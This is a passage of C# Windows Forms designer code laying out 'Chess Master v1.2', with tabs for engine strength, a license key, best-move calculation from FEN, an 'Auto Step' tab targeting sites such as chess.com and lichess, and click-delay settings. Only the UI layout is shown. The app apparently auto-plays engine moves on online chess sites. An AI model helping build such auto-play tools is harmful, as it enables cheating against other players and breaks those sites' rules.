            this.labelLicenseInfo.TabIndex = 24;
            this.labelLicenseInfo.Text = "License";
            // 
            // textBox1
            // 
            this.textBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.textBox1.Location = new System.Drawing.Point(25, 85);
            this.textBox1.Multiline = true;
            this.textBox1.Name = "textBox1";
            this.textBox1.ReadOnly = true;
            this.textBox1.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.textBox1.Size = new System.Drawing.Size(303, 164);
            this.textBox1.TabIndex = 16;
            this.textBox1.Text = "Chess Master v1.2";
            // 
            // comboBox1
            // 
            this.comboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.comboBox1.FormattingEnabled = true;
            this.comboBox1.Items.AddRange(new object[] {
            "5",
            "6",
            "7",
            "8",
            "9",
            "10",
            "11",
            "12",
            "13",
            "14",
            "15",
            "16",
            "17",
            "18",
            "19",
            "20"});
            this.comboBox1.Location = new System.Drawing.Point(207, 46);
            this.comboBox1.Name = "comboBox1";
            this.comboBox1.Size = new System.Drawing.Size(121, 24);
            this.comboBox1.TabIndex = 15;
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label1.ForeColor = System.Drawing.SystemColors.MenuHighlight;
            this.label1.Location = new System.Drawing.Point(21, 46);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(125, 20);
            this.label1.TabIndex = 14;
            this.label1.Text = "Engine Strength";
            // 
            // tabPage2
            // 
            this.tabPage2.BackColor = System.Drawing.SystemColors.Control;
            this.tabPage2.Controls.Add(this.buttonLicense);
            this.tabPage2.Controls.Add(this.textBoxLicense);
            this.tabPage2.Controls.Add(this.label2);
            this.tabPage2.Location = new System.Drawing.Point(4, 22);
            this.tabPage2.Name = "tabPage2";
            this.tabPage2.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage2.Size = new System.Drawing.Size(352, 289);
            this.tabPage2.TabIndex = 1;
            this.tabPage2.Text = "License";
            // 
            // buttonLicense
            // 
            this.buttonLicense.BackColor = System.Drawing.Color.DodgerBlue;
            this.buttonLicense.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.buttonLicense.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.buttonLicense.ForeColor = System.Drawing.SystemColors.ButtonFace;
            this.buttonLicense.Location = new System.Drawing.Point(114, 96);
            this.buttonLicense.Name = "buttonLicense";
            this.buttonLicense.Size = new System.Drawing.Size(112, 31);
            this.buttonLicense.TabIndex = 22;
            this.buttonLicense.Text = "Save";
            this.buttonLicense.UseVisualStyleBackColor = false;
            this.buttonLicense.Click += new System.EventHandler(this.button1_Click);
            // 
            // textBoxLicense
            // 
            this.textBoxLicense.Font = new System.Drawing.Font("Microsoft Sans Serif", 14F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.textBoxLicense.Location = new System.Drawing.Point(14, 61);
            this.textBoxLicense.MaxLength = 60;
            this.textBoxLicense.Name = "textBoxLicense";
            this.textBoxLicense.Size = new System.Drawing.Size(319, 29);
            this.textBoxLicense.TabIndex = 21;
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label2.ForeColor = System.Drawing.Color.Green;
            this.label2.Location = new System.Drawing.Point(10, 29);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(64, 20);
            this.label2.TabIndex = 20;
            this.label2.Text = "License";
            // 
            // tabPage3
            // 
            this.tabPage3.BackColor = System.Drawing.SystemColors.Control;
            this.tabPage3.Controls.Add(this.buttonStop);
            this.tabPage3.Controls.Add(this.labelCalcDepth);
            this.tabPage3.Controls.Add(this.comboBoxCalc);
            this.tabPage3.Controls.Add(this.textBoxCalculate);
            this.tabPage3.Controls.Add(this.labelResult);
            this.tabPage3.Controls.Add(this.linkLabel1);
            this.tabPage3.Controls.Add(this.buttonCalculate);
            this.tabPage3.Controls.Add(this.textBoxCalcFen);
            this.tabPage3.Controls.Add(this.label3);
            this.tabPage3.Location = new System.Drawing.Point(4, 22);
            this.tabPage3.Name = "tabPage3";
            this.tabPage3.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage3.Size = new System.Drawing.Size(352, 289);
            this.tabPage3.TabIndex = 2;
            this.tabPage3.Text = "Calculate Best Move";
            // 
            // buttonStop
            // 
            this.buttonStop.Location = new System.Drawing.Point(269, 256);
            this.buttonStop.Name = "buttonStop";
            this.buttonStop.Size = new System.Drawing.Size(70, 23);
            this.buttonStop.TabIndex = 31;
            this.buttonStop.Text = "Stop";
            this.buttonStop.UseVisualStyleBackColor = true;
            this.buttonStop.Click += new System.EventHandler(this.buttonStop_Click);
            // 
            // labelCalcDepth
            // 
            this.labelCalcDepth.AutoSize = true;
            this.labelCalcDepth.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.labelCalcDepth.ForeColor = System.Drawing.SystemColors.MenuHighlight;
            this.labelCalcDepth.Location = new System.Drawing.Point(181, 119);
            this.labelCalcDepth.Name = "labelCalcDepth";
            this.labelCalcDepth.Size = new System.Drawing.Size(62, 17);
            this.labelCalcDepth.TabIndex = 30;
            this.labelCalcDepth.Text = "Strength";
            // 
            // comboBoxCalc
            // 
            this.comboBoxCalc.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboBoxCalc.DropDownWidth = 90;
            this.comboBoxCalc.FormattingEnabled = true;
            this.comboBoxCalc.Items.AddRange(new object[] {
            "20",
            "30",
            "40",
            "50",
            "60",
            "70",
            "80",
            "90",
            "100"});
            this.comboBoxCalc.Location = new System.Drawing.Point(249, 118);
            this.comboBoxCalc.Name = "comboBoxCalc";
            this.comboBoxCalc.Size = new System.Drawing.Size(90, 21);
            this.comboBoxCalc.TabIndex = 29;
            // 
            // textBoxCalculate
            // 
            this.textBoxCalculate.BackColor = System.Drawing.Color.WhiteSmoke;
            this.textBoxCalculate.ForeColor = System.Drawing.Color.Black;
            this.textBoxCalculate.Location = new System.Drawing.Point(3, 145);
            this.textBoxCalculate.Multiline = true;
            this.textBoxCalculate.Name = "textBoxCalculate";
            this.textBoxCalculate.ReadOnly = true;
            this.textBoxCalculate.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.textBoxCalculate.Size = new System.Drawing.Size(336, 108);
            this.textBoxCalculate.TabIndex = 28;
            this.textBoxCalculate.Text = "Chess Master v1.2";
            // 
            // labelResult
            // 
            this.labelResult.AutoSize = true;
            this.labelResult.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.labelResult.ForeColor = System.Drawing.SystemColors.MenuHighlight;
            this.labelResult.Location = new System.Drawing.Point(6, 256);
            this.labelResult.Name = "labelResult";
            this.labelResult.Size = new System.Drawing.Size(48, 17);
            this.labelResult.TabIndex = 26;
            this.labelResult.Text = "Result";
            // 
            // linkLabel1
            // 
            this.linkLabel1.AutoSize = true;
            this.linkLabel1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.linkLabel1.Location = new System.Drawing.Point(309, 23);
            this.linkLabel1.Name = "linkLabel1";
            this.linkLabel1.Size = new System.Drawing.Size(36, 15);
            this.linkLabel1.TabIndex = 27;
            this.linkLabel1.TabStop = true;
            this.linkLabel1.Text = "Clear";
            this.linkLabel1.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.linkLabel1_LinkClicked);
            // 
            // buttonCalculate
            // 
            this.buttonCalculate.BackColor = System.Drawing.Color.DodgerBlue;
            this.buttonCalculate.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.buttonCalculate.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.buttonCalculate.ForeColor = System.Drawing.SystemColors.ButtonFace;
            this.buttonCalculate.Location = new System.Drawing.Point(108, 77);
            this.buttonCalculate.Name = "buttonCalculate";
            this.buttonCalculate.Size = new System.Drawing.Size(112, 31);
            this.buttonCalculate.TabIndex = 25;
            this.buttonCalculate.Text = "Calculate";
            this.buttonCalculate.UseVisualStyleBackColor = false;
            this.buttonCalculate.Click += new System.EventHandler(this.buttonCalculate_Click);
            // 
            // textBoxCalcFen
            // 
            this.textBoxCalcFen.Font = new System.Drawing.Font("Microsoft Sans Serif", 14F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.textBoxCalcFen.Location = new System.Drawing.Point(9, 42);
            this.textBoxCalcFen.MaxLength = 60;
            this.textBoxCalcFen.Name = "textBoxCalcFen";
            this.textBoxCalcFen.Size = new System.Drawing.Size(337, 29);
            this.textBoxCalcFen.TabIndex = 24;
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label3.ForeColor = System.Drawing.Color.Green;
            this.label3.Location = new System.Drawing.Point(5, 18);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(84, 20);
            this.label3.TabIndex = 23;
            this.label3.Text = "Enter FEN";
            // 
            // tabPage4
            // 
            this.tabPage4.BackColor = System.Drawing.SystemColors.Control;
            this.tabPage4.Controls.Add(this.textBoxCoord);
            this.tabPage4.Controls.Add(this.buttonSaveCoords);
            this.tabPage4.Controls.Add(this.comboBoxSites);
            this.tabPage4.Controls.Add(this.labelChess);
            this.tabPage4.Controls.Add(this.textBoxCoords);
            this.tabPage4.Controls.Add(this.buttonBorder);
            this.tabPage4.Location = new System.Drawing.Point(4, 22);
            this.tabPage4.Name = "tabPage4";
            this.tabPage4.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage4.Size = new System.Drawing.Size(352, 289);
            this.tabPage4.TabIndex = 3;
            this.tabPage4.Text = "Auto Step";
            // 
            // textBoxCoord
            // 
            this.textBoxCoord.BackColor = System.Drawing.SystemColors.Control;
            this.textBoxCoord.Location = new System.Drawing.Point(23, 113);
            this.textBoxCoord.Multiline = true;
            this.textBoxCoord.Name = "textBoxCoord";
            this.textBoxCoord.ReadOnly = true;
            this.textBoxCoord.Size = new System.Drawing.Size(313, 89);
            this.textBoxCoord.TabIndex = 5;
            // 
            // buttonSaveCoords
            // 
            this.buttonSaveCoords.BackColor = System.Drawing.SystemColors.Control;
            this.buttonSaveCoords.Enabled = false;
            this.buttonSaveCoords.FlatStyle = System.Windows.Forms.FlatStyle.System;
            this.buttonSaveCoords.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.buttonSaveCoords.ForeColor = System.Drawing.Color.Black;
            this.buttonSaveCoords.Location = new System.Drawing.Point(220, 213);
            this.buttonSaveCoords.Name = "buttonSaveCoords";
            this.buttonSaveCoords.Size = new System.Drawing.Size(116, 25);
            this.buttonSaveCoords.TabIndex = 4;
            this.buttonSaveCoords.Text = "Save";
            this.buttonSaveCoords.UseVisualStyleBackColor = false;
            this.buttonSaveCoords.Click += new System.EventHandler(this.button1_Click_1);
            // 
            // comboBoxSites
            // 
            this.comboBoxSites.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboBoxSites.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.comboBoxSites.FormattingEnabled = true;
            this.comboBoxSites.Items.AddRange(new object[] {
            "chess.com",
            "lichess.com",
            "1chess.org",
            "chess24.com",
            "chessbase.com"});
            this.comboBoxSites.Location = new System.Drawing.Point(23, 59);
            this.comboBoxSites.Name = "comboBoxSites";
            this.comboBoxSites.Size = new System.Drawing.Size(171, 24);
            this.comboBoxSites.TabIndex = 3;
            this.comboBoxSites.SelectedIndexChanged += new System.EventHandler(this.comboBoxSites_SelectedIndexChanged);
            // 
            // labelChess
            // 
            this.labelChess.AutoSize = true;
            this.labelChess.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.labelChess.ForeColor = System.Drawing.SystemColors.MenuHighlight;
            this.labelChess.Location = new System.Drawing.Point(20, 28);
            this.labelChess.Name = "labelChess";
            this.labelChess.Size = new System.Drawing.Size(83, 20);
            this.labelChess.TabIndex = 2;
            this.labelChess.Text = "Select site";
            // 
            // textBoxCoords
            // 
            this.textBoxCoords.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.textBoxCoords.Location = new System.Drawing.Point(23, 213);
            this.textBoxCoords.Name = "textBoxCoords";
            this.textBoxCoords.ReadOnly = true;
            this.textBoxCoords.Size = new System.Drawing.Size(171, 23);
            this.textBoxCoords.TabIndex = 1;
            // 
            // buttonBorder
            // 
            this.buttonBorder.BackColor = System.Drawing.Color.DodgerBlue;
            this.buttonBorder.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.buttonBorder.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.buttonBorder.ForeColor = System.Drawing.SystemColors.ButtonFace;
            this.buttonBorder.Location = new System.Drawing.Point(220, 57);
            this.buttonBorder.Name = "buttonBorder";
            this.buttonBorder.Size = new System.Drawing.Size(116, 29);
            this.buttonBorder.TabIndex = 0;
            this.buttonBorder.Text = "Open Frame";
            this.buttonBorder.UseVisualStyleBackColor = false;
            this.buttonBorder.Click += new System.EventHandler(this.buttonBorder_Click);
            // 
            // tabPage5
            // 
            this.tabPage5.BackColor = System.Drawing.SystemColors.Control;
            this.tabPage5.Controls.Add(this.labelDelay);
            this.tabPage5.Controls.Add(this.comboBoxDelay);
            this.tabPage5.Controls.Add(this.buttonSetConfig);
            this.tabPage5.Controls.Add(this.comboBoxThreads);
            this.tabPage5.Controls.Add(this.label5);
            this.tabPage5.Controls.Add(this.label4);
            this.tabPage5.Controls.Add(this.comboBoxHash);
            this.tabPage5.Location = new System.Drawing.Point(4, 22);
            this.tabPage5.Name = "tabPage5";
            this.tabPage5.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage5.Size = new System.Drawing.Size(352, 289);
            this.tabPage5.TabIndex = 4;
            this.tabPage5.Text = "Config";
            // 
            // labelDelay
            // 
            this.labelDelay.AutoSize = true;
            this.labelDelay.Font = new System.Drawing.Font("Microsoft Sans Serif", 11F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.labelDelay.ForeColor = System.Drawing.SystemColors.MenuHighlight;
            this.labelDelay.Location = new System.Drawing.Point(204, 40);
            this.labelDelay.Name = "labelDelay";
            this.labelDelay.Size = new System.Drawing.Size(125, 18);
            this.labelDelay.TabIndex = 25;
            this.labelDelay.Text = "Clicks Delay (ms)";
            // 
            // comboBoxDelay
            // 
            this.comboBoxDelay.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboBoxDelay.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.comboBoxDelay.FormattingEnabled = true;
            this.comboBoxDelay.Items.AddRange(new object[] {
            "20",
            "40",
            "60",
            "80",
            "100",
            "120",
            "150",
            "180",
            "200",
            "250",
            "280",
            "300",
            "350",
            "400",
            "450",
            "500"});
            this.comboBoxDelay.Location = new System.Drawing.Point(207, 61);
            this.comboBoxDelay.Name = "comboBoxDelay";
            this.comboBoxDelay.Size = new System.Drawing.Size(126, 24);
            this.comboBoxDelay.TabIndex = 24;
            // 
            // buttonSetConfig
            // 
            this.buttonSetConfig.BackColor = System.Drawing.Color.DodgerBlue;
            this.buttonSetConfig.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.buttonSetConfig.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.buttonSetConfig.ForeColor = System.Drawing.SystemColors.ButtonFace;
            this.buttonSetConfig.Location = new System.Drawing.Point(14, 182);
            this.buttonSetConfig.Name = "buttonSetConfig";
            this.buttonSetConfig.Size = new System.Drawing.Size(112, 31);
            this.buttonSetConfig.TabIndex = 23;
            this.buttonSetConfig.Text = "Set";
            this.buttonSetConfig.UseVisualStyleBackColor = false;
            this.buttonSetConfig.Click += new System.EventHandler(this.buttonSetConfig_Click);
            // 
            // comboBoxThreads
            // 
            this.comboBoxThreads.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboBoxThreads.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.comboBoxThreads.FormattingEnabled = true;
            this.comboBoxThreads.Items.AddRange(new object[] {
            "1",
            "2",
            "4",
            "8"});
            this.comboBoxThreads.Location = new System.Drawing.Point(14, 135);
            this.comboBoxThreads.Name = "comboBoxThreads";
            this.comboBoxThreads.Size = new System.Drawing.Size(126, 24);
            this.comboBoxThreads.TabIndex = 5;
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.Font = new System.Drawing.Font("Microsoft Sans Serif", 11F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label5.ForeColor = System.Drawing.SystemColors.MenuHighlight;
            this.label5.Location = new System.Drawing.Point(11, 114);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(62, 18);
            this.label5.TabIndex = 4;
            this.label5.Text = "Threads";
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Font = new System.Drawing.Font("Microsoft Sans Serif", 11F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label4.ForeColor = System.Drawing.SystemColors.MenuHighlight;
            this.label4.Location = new System.Drawing.Point(11, 40);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(115, 18);
            this.label4.TabIndex = 3;
            this.label4.Text = "Hash table (MB)";
            // 
            // comboBoxHash
            // 
            this.comboBoxHash.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboBoxHash.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.comboBoxHash.FormattingEnabled = true;
            this.comboBoxHash.Items.AddRange(new object[] {
            "16",
            "32",
            "64",
            "128",
            "256",
            "512",
            "1024",
            "2048"});
            this.comboBoxHash.Location = new System.Drawing.Point(14, 61);
            this.comboBoxHash.Name = "comboBoxHash";
            this.comboBoxHash.Size = new System.Drawing.Size(126, 24);
            this.comboBoxHash.TabIndex = 0;
            // 
            // linkLabelInfo
            // 
            this.linkLabelInfo.AutoSize = true;
            this.linkLabelInfo.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.linkLabelInfo.Location = new System.Drawing.Point(329, 350);
            this.linkLabelInfo.Name = "linkLabelInfo";
            this.linkLabelInfo.Size = new System.Drawing.Size(38, 15);
            this.linkLabelInfo.TabIndex = 27;
            this.linkLabelInfo.TabStop = true;
            this.linkLabelInfo.Text = "About";
            this.linkLabelInfo.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.linkLabelInfo_LinkClicked);
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(384, 371);
            this.Controls.Add(this.linkLabelInfo);
            this.Controls.Add(this.tabControl1);
            this.Controls.Add(this.statusStrip1);
            this.Controls.Add(this.menuStrip1);
            this.MainMenuStrip = this.menuStrip1;
            this.MaximizeBox = false;
            this.MaximumSize = new System.Drawing.Size(400, 410);
            this.MinimumSize = new System.Drawing.Size(400, 410);
            this.Name = "Form1";
            this.Text = "Chess Master";
            this.Load += new System.EventHandler(this.Form1_Load);
            this.menuStrip1.ResumeLayout(false);
            this.menuStrip1.PerformLayout();
            this.statusStrip1.ResumeLayout(false);
            this.statusStrip1.PerformLayout();
            this.tabControl1.ResumeLayout(false);
            this.tabPage1.ResumeLayout(false);
            this.tabPage1.PerformLayout();
            this.tabPage2.ResumeLayout(false);
            this.tabPage2.PerformLayout();
            this.tabPage3.ResumeLayout(false);
            this.tabPage3.PerformLayout();
            this.tabPage4.ResumeLayout(false);
            this.tabPage4.PerformLayout();
            this.tabPage5.ResumeLayout(false);
            this.tabPage5.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();

		}

        private void Form1_Load(object sender, EventArgs e)
        {

        }
    }
}
